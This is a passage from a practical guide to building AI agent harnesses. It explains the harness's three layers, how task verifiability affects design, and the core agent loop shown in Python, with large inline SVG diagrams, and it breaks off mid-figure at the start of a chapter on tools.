# Building Effective Agent Harness

*A pracrical guide.*

---

# Part I: Harness concepts

---

## 1. What is an agent harness?

A language model on its own is a text-to-text function. It takes a prompt, returns a response, and takes no action in the world. To turn a model into an agent, you need a program around it. The program feeds the model information at the right time and gives it a stable set of actions. It executes those actions, feeds the results back, and repeats until the goal is reached.

<div class="figure">
<svg viewBox="0 0 912 262" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="c1-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="c1-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="c1-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="c1-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="c1-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="c1-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<polygon points="0.0,18.0 111.0,18.0 121.0,32.0 111.0,46.0 0.0,46.0" fill="#FF9900"/>
<text x="55.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Plan</text>
<path d="M50.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="114.0,18.0 225.0,18.0 235.0,32.0 225.0,46.0 114.0,46.0 124.0,32.0" fill="#FF9900"/>
<text x="169.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Specify</text>
<path d="M164.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="228.0,18.0 339.0,18.0 349.0,32.0 339.0,46.0 228.0,46.0 238.0,32.0" fill="#FF9900"/>
<text x="283.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Build</text>
<path d="M278.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="342.0,18.0 453.0,18.0 463.0,32.0 453.0,46.0 342.0,46.0 352.0,32.0" fill="#FF9900"/>
<text x="397.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Test</text>
<path d="M392.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="456.0,18.0 567.0,18.0 577.0,32.0 567.0,46.0 456.0,46.0 466.0,32.0" fill="#FF9900"/>
<text x="511.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Verify</text>
<path d="M506.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="570.0,18.0 681.0,18.0 691.0,32.0 681.0,46.0 570.0,46.0 580.0,32.0" fill="#FF9900"/>
<text x="625.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Deploy</text>
<path d="M620.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="684.0,18.0 795.0,18.0 805.0,32.0 795.0,46.0 684.0,46.0 694.0,32.0" fill="#edf0f4"/>
<text x="739.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Eval</text>
<polygon points="798.0,18.0 909.0,18.0 919.0,32.0 909.0,46.0 798.0,46.0 808.0,32.0" fill="#FF9900"/>
<text x="853.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Operate</text>
<path d="M848.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<path d="M853.5 17.0 C853.5 -1.0 55.5 -1.0 55.5 17.0" fill="none" stroke="#8a96a8" stroke-width="1.2" stroke-dasharray="4 3" marker-end="url(#c1-g)"/>
<rect x="338.0" y="-2.0" width="236.0" height="12.0" rx="2" fill="#ffffff" stroke="none" stroke-width="1.2"/>
<text x="456.0" y="7.0" font-size="9" fill="#6b7a90" text-anchor="middle" font-weight="normal">production feedback returns to planning</text>
<text x="138.0" y="72.0" font-size="8" fill="#6b7a90" text-anchor="middle" font-weight="700">WHERE IT SITS IN THE HARNESS</text>
<path d="M183.0 115.0 L292 64 L292 252 L183.0 205.0 Z" fill="#FF9900" opacity="0.10"/>
<line x1="183.0" y1="115.0" x2="292" y2="64" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<line x1="183.0" y1="205.0" x2="292" y2="252" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<path d="M119.1 98.9 A64 64 0 0 1 156.9 98.9 L146.9 131.3 A30 30 0 0 0 129.1 131.3 Z" fill="#ffd699" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="87.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">3 Tools</text>
<path d="M158.6 99.4 A64 64 0 0 1 189.2 121.7 L162.0 142.0 A30 30 0 0 0 147.7 131.6 Z" fill="#ffd699" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="104.4" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">4 Context</text>
<path d="M190.3 123.1 A64 64 0 0 1 202.0 159.1 L168.0 159.6 A30 30 0 0 0 162.5 142.7 Z" fill="#ffd699" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="140.9" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">5 Caching</text>
<path d="M202.0 160.9 A64 64 0 0 1 190.3 196.9 L162.5 177.3 A30 30 0 0 0 168.0 160.4 Z" fill="#ffd699" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="186.1" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">6 Memory</text>
<path d="M189.2 198.3 A64 64 0 0 1 158.6 220.6 L147.7 188.4 A30 30 0 0 0 162.0 178.0 Z" fill="#ffd699" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="222.6" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">7 Bounds</text>
<path d="M156.9 221.1 A64 64 0 0 1 119.1 221.1 L129.1 188.7 A30 30 0 0 0 146.9 188.7 Z" fill="#ffd699" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="241.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">8 Agents</text>
<path d="M117.4 220.6 A64 64 0 0 1 86.8 198.3 L114.0 178.0 A30 30 0 0 0 128.3 188.4 Z" fill="#ffd699" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="222.6" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">9 Sandbox</text>
<path d="M85.7 196.9 A64 64 0 0 1 74.0 160.9 L108.0 160.4 A30 30 0 0 0 113.5 177.3 Z" fill="#ffd699" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="186.1" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">10 Evals</text>
<path d="M74.0 159.1 A64 64 0 0 1 85.7 123.1 L113.5 142.7 A30 30 0 0 0 108.0 159.6 Z" fill="#ffd699" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="140.9" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">11 Cost</text>
<path d="M86.8 121.7 A64 64 0 0 1 117.4 99.4 L128.3 131.6 A30 30 0 0 0 114.0 142.0 Z" fill="#ffd699" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="104.4" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">12 Observe</text>
<circle cx="138.0" cy="160.0" r="27" fill="#FF9900"/>
<text x="138.0" y="159.0" font-size="8.5" fill="#232F3E" text-anchor="middle" font-weight="700">2 Core</text>
<text x="138.0" y="169.0" font-size="8.5" fill="#232F3E" text-anchor="middle" font-weight="700">loop</text>
<rect x="292.0" y="62.0" width="620.0" height="192.0" rx="8" fill="#f8f9fb" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="308.0" y="82.0" font-size="11.5" fill="#1a1a2e" text-anchor="start" font-weight="700">Three layers in every harness</text>
<text x="386.0" y="106.0" font-size="8" fill="#0052CC" text-anchor="middle" font-weight="700">DATA AND API: DETERMINISTIC</text>
<rect x="316.0" y="114.0" width="140.0" height="28.0" rx="5" fill="#e6f0ff" stroke="#b3d4ff" stroke-width="1.2"/>
<text x="386.0" y="131.4" font-size="9.5" fill="#1a1a2e" text-anchor="middle" font-weight="600">Internal services</text>
<rect x="316.0" y="148.0" width="140.0" height="28.0" rx="5" fill="#e6f0ff" stroke="#b3d4ff" stroke-width="1.2"/>
<text x="386.0" y="165.4" font-size="9.5" fill="#1a1a2e" text-anchor="middle" font-weight="600">Third-party APIs</text>
<rect x="316.0" y="182.0" width="140.0" height="28.0" rx="5" fill="#e6f0ff" stroke="#b3d4ff" stroke-width="1.2"/>
<text x="386.0" y="199.4" font-size="9.5" fill="#1a1a2e" text-anchor="middle" font-weight="600">MCP servers</text>
<text x="590.0" y="106.0" font-size="8" fill="#9a5b00" text-anchor="middle" font-weight="700">MODEL: PROBABILISTIC</text>
<rect x="520.0" y="136.0" width="140.0" height="56.0" rx="5" fill="#FF9900" stroke="#FF9900" stroke-width="1.2"/>
<text x="590.0" y="162.5" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="600">Model layer</text>
<text x="590.0" y="174.0" font-size="8.5" fill="#4a3200" text-anchor="middle" font-weight="normal">model, prompts, inference</text>
<text x="750.0" y="106.0" font-size="8" fill="#1e7e34" text-anchor="middle" font-weight="700">VERIFICATION: MIXED</text>
<rect x="692.0" y="136.0" width="116.0" height="56.0" rx="5" fill="#e3fcef" stroke="#1e7e34" stroke-width="1.2"/>
<text x="750.0" y="162.5" font-size="10" fill="#1e7e34" text-anchor="middle" font-weight="600">Verification</text>
<text x="750.0" y="174.0" font-size="8.5" fill="#1e7e34" text-anchor="middle" font-weight="normal">evals, handoff checks</text>
<rect x="836.0" y="136.0" width="60.0" height="56.0" rx="5" fill="#ffffff" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="866.0" y="162.5" font-size="10" fill="#1a1a2e" text-anchor="middle" font-weight="600">Output</text>
<text x="866.0" y="174.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">the world</text>
<line x1="518.0" y1="146.0" x2="459.0" y2="128.0" stroke="#0052CC" stroke-width="1.4" marker-end="url(#c1-b)"/>
<text x="486.0" y="128.0" font-size="8.5" fill="#0052CC" text-anchor="middle" font-weight="normal">tool calls</text>
<line x1="459.0" y1="163.0" x2="518.0" y2="166.0" stroke="#8a96a8" stroke-width="1.4" marker-end="url(#c1-g)"/>
<line x1="459.0" y1="196.0" x2="518.0" y2="182.0" stroke="#8a96a8" stroke-width="1.4" marker-end="url(#c1-g)"/>
<text x="488.0" y="206.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">results</text>
<line x1="662.5" y1="164.0" x2="689.5" y2="164.0" stroke="#232F3E" stroke-width="1.4" marker-end="url(#c1-d)"/>
<line x1="810.5" y1="164.0" x2="833.5" y2="164.0" stroke="#1e7e34" stroke-width="1.4" marker-end="url(#c1-gr)"/>
<path d="M750 194 C750 236 590 236 590 196" fill="none" stroke="#de350b" stroke-width="1.4" stroke-dasharray="4 3" marker-end="url(#c1-r)"/>
<text x="670.0" y="244.0" font-size="9" fill="#de350b" text-anchor="middle" font-weight="normal">reject and retry</text>
</svg>
</div>

That program is the agent harness. Everything a user experiences as "the agent" lives in the harness rather than in the model. The memory, the tool use, the multi-step reasoning, and the ability to keep working through a long task are all harness behavior. Two agents built on the same model behave differently when their harnesses differ.

The model produces each token. The harness decides which tokens the model sees, which actions its output triggers, and what happens as a result. A harness is ordinary software engineering applied to a probabilistic component, in the way that an operating system manages a CPU.

### 1.1 The three layers

Split any harness into three layers before designing it, because each layer fails differently and each rewards a different kind of effort.

| Layer        | What it holds                                                                                                 | Nature        |
| ------------ | ------------------------------------------------------------------------------------------------------------- | ------------- |
| Model        | How intelligence is consumed: the model, the prompts, the inference pattern                                   | Probabilistic |
| Data and API | What the harness reads and calls: internal services, third-party APIs, MCP servers                            | Deterministic |
| Verification | What stops bad output from spreading: evaluation, structured handoffs, rules about passing unverified data on | Mixed         |

The data and API layer is ordinary software engineering, and ordinary tests cover it. The verification layer is the one most teams skip, and skipping it is why a small error in step two becomes a confidently wrong answer in step nine. The model layer carries one warning: the harness around a model changes its cost and its accuracy, so evaluate the model and the harness together, as chapter 10 describes.

### 1.2 How much harness a task needs

Not every task needs the same amount of harness, and the deciding property is how easily you can tell whether the output is correct.

A *hard-verifiable* task carries a built-in feedback signal. Code is the clearest example, because tests pass or fail and the model can iterate against that signal without help. The harness can stay light. A *soft-verifiable* task has no such signal. Filing a tax return is the standard example, because you cannot tell whether it was right until much later. Here the harness has to replace the missing signal, which means more verification, more structure, and more human checkpoints.

Decide which kind of task you have before deciding how much harness to build. A heavy harness on a hard-verifiable task wastes effort. A light one on a soft-verifiable task ships something nobody can trust.

Supporting frameworks: Strands (A.1), AgentCore (A.2), KiroCrew (A.3), Pi (A.4), LangChain (A.5), OpenAI (A.6), Stirrup (A.7).

---

## 2. The core loop

Every agent harness runs a variation of the same loop.

<div class="figure">
<svg viewBox="0 0 912 262" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="c2-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="c2-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="c2-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="c2-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="c2-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="c2-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<polygon points="0.0,18.0 111.0,18.0 121.0,32.0 111.0,46.0 0.0,46.0" fill="#FF9900"/>
<text x="55.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Plan</text>
<path d="M50.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="114.0,18.0 225.0,18.0 235.0,32.0 225.0,46.0 114.0,46.0 124.0,32.0" fill="#FF9900"/>
<text x="169.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Specify</text>
<path d="M164.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="228.0,18.0 339.0,18.0 349.0,32.0 339.0,46.0 228.0,46.0 238.0,32.0" fill="#FF9900"/>
<text x="283.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Build</text>
<path d="M278.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="342.0,18.0 453.0,18.0 463.0,32.0 453.0,46.0 342.0,46.0 352.0,32.0" fill="#FF9900"/>
<text x="397.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Test</text>
<path d="M392.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="456.0,18.0 567.0,18.0 577.0,32.0 567.0,46.0 456.0,46.0 466.0,32.0" fill="#FF9900"/>
<text x="511.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Verify</text>
<path d="M506.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="570.0,18.0 681.0,18.0 691.0,32.0 681.0,46.0 570.0,46.0 580.0,32.0" fill="#FF9900"/>
<text x="625.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Deploy</text>
<path d="M620.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="684.0,18.0 795.0,18.0 805.0,32.0 795.0,46.0 684.0,46.0 694.0,32.0" fill="#edf0f4"/>
<text x="739.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Eval</text>
<polygon points="798.0,18.0 909.0,18.0 919.0,32.0 909.0,46.0 798.0,46.0 808.0,32.0" fill="#FF9900"/>
<text x="853.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Operate</text>
<path d="M848.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<path d="M853.5 17.0 C853.5 -1.0 55.5 -1.0 55.5 17.0" fill="none" stroke="#8a96a8" stroke-width="1.2" stroke-dasharray="4 3" marker-end="url(#c2-g)"/>
<rect x="338.0" y="-2.0" width="236.0" height="12.0" rx="2" fill="#ffffff" stroke="none" stroke-width="1.2"/>
<text x="456.0" y="7.0" font-size="9" fill="#6b7a90" text-anchor="middle" font-weight="normal">production feedback returns to planning</text>
<text x="138.0" y="72.0" font-size="8" fill="#6b7a90" text-anchor="middle" font-weight="700">WHERE IT SITS IN THE HARNESS</text>
<path d="M158.0 160.0 L292 64 L292 252 L158.0 160.0 Z" fill="#FF9900" opacity="0.10"/>
<line x1="158.0" y1="160.0" x2="292" y2="64" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<line x1="158.0" y1="160.0" x2="292" y2="252" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<path d="M119.1 98.9 A64 64 0 0 1 156.9 98.9 L146.9 131.3 A30 30 0 0 0 129.1 131.3 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="87.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">3 Tools</text>
<path d="M158.6 99.4 A64 64 0 0 1 189.2 121.7 L162.0 142.0 A30 30 0 0 0 147.7 131.6 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="104.4" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">4 Context</text>
<path d="M190.3 123.1 A64 64 0 0 1 202.0 159.1 L168.0 159.6 A30 30 0 0 0 162.5 142.7 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="140.9" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">5 Caching</text>
<path d="M202.0 160.9 A64 64 0 0 1 190.3 196.9 L162.5 177.3 A30 30 0 0 0 168.0 160.4 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="186.1" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">6 Memory</text>
<path d="M189.2 198.3 A64 64 0 0 1 158.6 220.6 L147.7 188.4 A30 30 0 0 0 162.0 178.0 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="222.6" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">7 Bounds</text>
<path d="M156.9 221.1 A64 64 0 0 1 119.1 221.1 L129.1 188.7 A30 30 0 0 0 146.9 188.7 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="241.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">8 Agents</text>
<path d="M117.4 220.6 A64 64 0 0 1 86.8 198.3 L114.0 178.0 A30 30 0 0 0 128.3 188.4 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="222.6" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">9 Sandbox</text>
<path d="M85.7 196.9 A64 64 0 0 1 74.0 160.9 L108.0 160.4 A30 30 0 0 0 113.5 177.3 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="186.1" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">10 Evals</text>
<path d="M74.0 159.1 A64 64 0 0 1 85.7 123.1 L113.5 142.7 A30 30 0 0 0 108.0 159.6 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="140.9" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">11 Cost</text>
<path d="M86.8 121.7 A64 64 0 0 1 117.4 99.4 L128.3 131.6 A30 30 0 0 0 114.0 142.0 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="104.4" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">12 Observe</text>
<circle cx="138.0" cy="160.0" r="27" fill="#FF9900"/>
<text x="138.0" y="159.0" font-size="8.5" fill="#232F3E" text-anchor="middle" font-weight="700">2 Core</text>
<text x="138.0" y="169.0" font-size="8.5" fill="#232F3E" text-anchor="middle" font-weight="700">loop</text>
<rect x="292.0" y="62.0" width="620.0" height="192.0" rx="8" fill="#f8f9fb" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="308.0" y="82.0" font-size="11.5" fill="#1a1a2e" text-anchor="start" font-weight="700">One loop, six calls</text>
<rect x="328.0" y="154.0" width="128.0" height="24.0" rx="5" fill="#ffffff" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="392.0" y="169.4" font-size="9.5" fill="#1a1a2e" text-anchor="middle" font-weight="600" font-family="SFMono-Regular, Menlo, Consolas, monospace">assemble_context</text>
<rect x="435.0" y="110.7" width="128.0" height="24.0" rx="5" fill="#232F3E" stroke="#232F3E" stroke-width="1.2"/>
<text x="499.0" y="126.1" font-size="9.5" fill="#ffffff" text-anchor="middle" font-weight="600" font-family="SFMono-Regular, Menlo, Consolas, monospace">model</text>
<rect x="649.0" y="110.7" width="128.0" height="24.0" rx="5" fill="#ffffff" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="713.0" y="126.1" font-size="9.5" fill="#1a1a2e" text-anchor="middle" font-weight="600" font-family="SFMono-Regular, Menlo, Consolas, monospace">parse_tool_calls</text>
<rect x="756.0" y="154.0" width="128.0" height="24.0" rx="5" fill="#ffffff" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="820.0" y="169.4" font-size="9.5" fill="#1a1a2e" text-anchor="middle" font-weight="600" font-family="SFMono-Regular, Menlo, Consolas, monospace">execute</text>
<rect x="649.0" y="197.3" width="128.0" height="24.0" rx="5" fill="#ffffff" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="713.0" y="212.7" font-size="9.5" fill="#1a1a2e" text-anchor="middle" font-weight="600" font-family="SFMono-Regular, Menlo, Consolas, monospace">history</text>
<rect x="435.0" y="197.3" width="128.0" height="24.0" rx="5" fill="#ffffff" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="499.0" y="212.7" font-size="9.5" fill="#1a1a2e" text-anchor="middle" font-weight="600" font-family="SFMono-Regular, Menlo, Consolas, monospace">check_completion</text>
<line x1="427.8" y1="151.5" x2="463.2" y2="137.2" stroke="#232F3E" stroke-width="1.4" marker-end="url(#c2-d)"/>
<line x1="565.5" y1="122.7" x2="646.5" y2="122.7" stroke="#232F3E" stroke-width="1.4" marker-end="url(#c2-d)"/>
<line x1="748.8" y1="137.2" x2="784.2" y2="151.5" stroke="#232F3E" stroke-width="1.4" marker-end="url(#c2-d)"/>
<line x1="784.2" y1="180.5" x2="748.8" y2="194.8" stroke="#232F3E" stroke-width="1.4" marker-end="url(#c2-d)"/>
<line x1="646.5" y1="209.3" x2="565.5" y2="209.3" stroke="#232F3E" stroke-width="1.4" marker-end="url(#c2-d)"/>
<line x1="463.2" y1="194.8" x2="427.8" y2="180.5" stroke="#232F3E" stroke-width="1.4" marker-end="url(#c2-d)"/>
<text x="606.0" y="170.0" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal" font-family="SFMono-Regular, Menlo, Consolas, monospace">while not done</text>
<rect x="318.0" y="224.0" width="96.0" height="22.0" rx="5" fill="#e3fcef" stroke="#1e7e34" stroke-width="1.2"/>
<text x="366.0" y="238.2" font-size="9" fill="#1e7e34" text-anchor="middle" font-weight="600">exit when done</text>
<line x1="432.5" y1="222.2" x2="416.5" y2="225.2" stroke="#1e7e34" stroke-width="1.4" marker-end="url(#c2-gr)"/>
</svg>
</div>

```python
while not done:
    context  = assemble_context(goal, history, retrieved, state)
    response = model(context)
    actions  = parse_tool_calls(response)
    results  = execute(actions)
    history += (response, results)
    done     = check_completion(response, results)
```

The engineering lives inside each of those calls. `assemble_context` decides what goes in, in what order, and what gets cut when the conversation grows long, which matters because the window is finite and every token costs latency and money. The `model` call is one request or a stream, with a model tier, retries, and timeouts you choose. `parse_tool_calls` reads structured JSON from a native tool-calling API or parses freeform text. `execute` runs the action under some set of permissions, inside some boundary, with or without asking the user first. The `history` line keeps turns verbatim, summarizes them, or prunes them selectively. `check_completion` ends the loop, either because the model declared completion, the harness detected it, or a limit forced it.

### 2.1 The loop is not the hard part

The loop above is short, and it works the same way in every framework. The differences between harnesses are in the layer around it, which is context, caching, tools, bounds, isolation, and verification. Spend engineering effort on that layer.

### 2.2 Only two parts are non-deterministic

Inside a harness, two things are probabilistic: context management and evaluation. Everything else is deterministic code.

Tool execution, API calls, state files, permission checks, retries, and cost accounting are deterministic, and ordinary unit tests cover them. Test that majority in the ordinary way, and keep experiments for the two parts that need them.

Supporting frameworks: Strands (A.1), AgentCore (A.2), Pi (A.4), LangChain (A.5), OpenAI (A.6), Stirrup (A.7).

---

## 3. Tools and tool contracts

A tool is any function the harness exposes to the model, such as `read_file`, `run_bash`, `search_web`, or `create_pull_request`. Modern harnesses declare them with JSON schema, because every frontier model has a native tool-calling API.

<div class="figure">
<svg viewBox="0 0 912 262" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="c3-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="c3-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="c3-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="c3-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="c3-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="c3-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<polygon points="0.0,18.0 111.0,18.0 121.0,32.0 111.0,46.0 0.0,46.0" fill="#edf0f4"/>
<text x="55.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Plan</text>
<polygon points="114.0,18.0 225.0,18.0 235.0,32.0 225.0,46.0 114.0,46.0 124.0,32.0" fill="#edf0f4"/>
<text x="169.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Specify</text>
<polygon points="228.0,18.0 339.0,18.0 349.0,32.0 339.0,46.0 228.0,46.0 238.0,32.0" fill="#FF9900"/>
<text x="283.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Build</text>
<path d="M278.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="342.0,18.0 453.0,18.0 463.0,32.0 453.0,46.0 342.0,46.0 352.0,32.0" fill="#FF9900"/>
<text x="397.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Test</text>
<path d="M392.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="456.0,18.0 567.0,18.0 577.0,32.0 567.0,46.0 456.0,46.0 466.0,32.0" fill="#edf0f4"/>
<text x="511.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Verify</text>
<polygon points="570.0,18.0 681.0,18.0 691.0,32.0 681.0,46.0 570.0,46.0 580.0,32.0" fill="#FF9900"/>
<text x="625.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Deploy</text>
<path d="M620.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="684.0,18.0 795.0,18.0 805.0,32.0 795.0,46.0 684.0,46.0 694.0,32.0" fill="#edf0f4"/>
<text x="739.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Eval</text>
<polygon points="798.0,18.0 909.0,18.0 919.0,32.0 909.0,46.0 798.0,46.0 808.0,32.0" fill="#edf0f4"/>
